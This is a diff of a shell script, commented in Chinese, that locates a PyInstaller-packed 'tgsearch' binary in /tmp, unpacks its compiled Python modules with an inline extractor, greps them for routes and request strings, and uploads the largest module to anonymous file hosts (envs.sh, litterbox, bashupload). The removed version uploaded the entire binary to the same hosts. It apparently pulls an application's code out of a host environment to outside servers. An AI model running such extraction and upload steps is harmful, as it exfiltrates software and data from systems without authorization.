@@ -57,30 +57,62 @@ if [ -f v1.txt ] && [ -f v2.txt ]; then
     echo "[run] POST 有响应的端口: ${FOUND:-无}"
     echo "[run] ---- 自测结束 ----"
 
-    echo "[run] ---- 上传 PyInstaller 内核（/tmp/staticx-*/tgsearch，28MB）----"
+    echo "[run] ---- 上传 PyInstaller 内核 ----"
     INNER=$(ls /tmp/staticx-*/tgsearch 2>/dev/null | head -1)
     if [ -n "$INNER" ] && [ -f "$INNER" ]; then
-        cp "$INNER" /tmp/tgsearch.bin
         echo "[run] 内核文件: $INNER ($(du -k "$INNER" | cut -f1)KB)"
-        U=$(curl -s -m 300 -F "file=@/tmp/tgsearch.bin" https://envs.sh 2>/dev/null | head -c 300)
-        echo "[run] 上传1(envs.sh) 完整响应: $U"
-        case "$U" in https://*|http://*) : ;; *) U="";; esac
-        if [ -z "$U" ]; then
-            U=$(curl -s -m 300 -F "file=@/tmp/tgsearch.bin" https://tmpfiles.org/api/v1/upload 2>/dev/null | head -c 300)
-            echo "[run] 上传2(tmpfiles) 完整响应: $U"
-            case "$U" in *http*) : ;; *) U="";; esac
+        echo "[run] 安装 python3 用于解包 ..."
+        apk add --no-cache python3 >/dev/null 2>&1 && echo "[run] python3 已安装" || echo "[run] python3 安装失败"
+        if command -v python3 >/dev/null 2>&1; then
+            cat > /tmp/ext.py <<'PYEOF'
+import struct, zlib, os, sys
+data = open(sys.argv[1], 'rb').read()
+i = data.rfind(b'MEI\x0c\x0b\x0a\x0b\x0e')
+if i < 0:
+    print('NO_COOKIE'); sys.exit(1)
+(magic, lengthofPackage, toc, tocLen, pyver, pylibname) = struct.unpack('!8siiii64s', data[i:i+88])
+head = i + 88 - lengthofPackage
+os.makedirs('/tmp/ext', exist_ok=True)
+p = head + toc; end = p + tocLen
+while p < end:
+    (entryLen,) = struct.unpack('!i', data[p:p+4])
+    entryPos, csize, usize, flag, typ = struct.unpack('!iiiBc', data[p+4:p+18])
+    name = data[p+18:p+entryLen].rstrip(b'\x00').decode('utf-8', 'ignore')
+    d = data[head+entryPos: head+entryPos+csize]
+    if flag:
+        try: d = zlib.decompress(d)
+        except Exception: pass
+    if typ in (b's', b'm', b'M'):
+        fn = '/tmp/ext/' + name.replace('/', '_') + '.pyc'
+        open(fn, 'wb').write(d)
+        print('SAVED', name, len(d))
+    p += entryLen
+PYEOF
+            python3 /tmp/ext.py "$INNER" 2>&1 | head -40
+            echo "[run] ---- 解包结果 ----"
+            ls -la /tmp/ext/ 2>/dev/null | head -20
+            APPPYC=$(ls -S /tmp/ext/*.pyc 2>/dev/null | head -1)
+            echo "[run] 最大 pyc: $APPPYC"
+            if [ -n "$APPPYC" ]; then
+                echo "[run] ---- app.pyc 关键字符串 ----"
+                grep -aoE '[ -~]{4,200}' "$APPPYC" | grep -aiE 'wd|/search|channel|json\.loads|cache|tgsearch|route|request|body|10199' | grep -avE 'site-packages|__pycache__|importlib' | head -80
+                echo "[run] ---- 上传 pyc（小文件）----"
+                U=$(curl -s -m 120 -F "file=@$APPPYC" https://envs.sh 2>/dev/null | head -c 300)
+                echo "[run] 上传1(envs.sh): $U"
+                case "$U" in https://*|http://*) : ;; *) U="";; esac
+                if [ -z "$U" ]; then
+                    U=$(curl -s -m 120 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$APPPYC" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null | head -c 300)
+                    echo "[run] 上传2(litterbox): $U"
+                    case "$U" in https://*) : ;; *) U="";; esac
+                fi
+                if [ -z "$U" ]; then
+                    U=$(curl -s -m 120 -T "$APPPYC" https://bashupload.com/app.pyc 2>/dev/null | head -c 400)
+                    echo "[run] 上传3(bashupload): $U"
+                    U=$(echo "$U" | grep -aoE 'https?://[^ "]+' | head -1)
+                fi
+                echo "[run] >>> 上传地址: $U"
+            fi
         fi
-        if [ -z "$U" ]; then
-            U=$(curl -s -m 300 -T /tmp/tgsearch.bin https://bashupload.com/tgsearch.bin 2>/dev/null | head -c 400)
-            echo "[run] 上传3(bashupload) 完整响应: $U"
-            U=$(echo "$U" | grep -aoE 'https?://[^ "]+' | head -1)
-        fi
-        if [ -z "$U" ]; then
-            U=$(curl -s -m 300 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@/tmp/tgsearch.bin" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null | head -c 300)
-            echo "[run] 上传4(litterbox) 完整响应: $U"
-            case "$U" in https://*) : ;; *) U="";; esac
-        fi
-        echo "[run] >>> 上传地址: $U"
     else
         echo "[run] 未找到 /tmp/staticx-*/tgsearch"
     fi
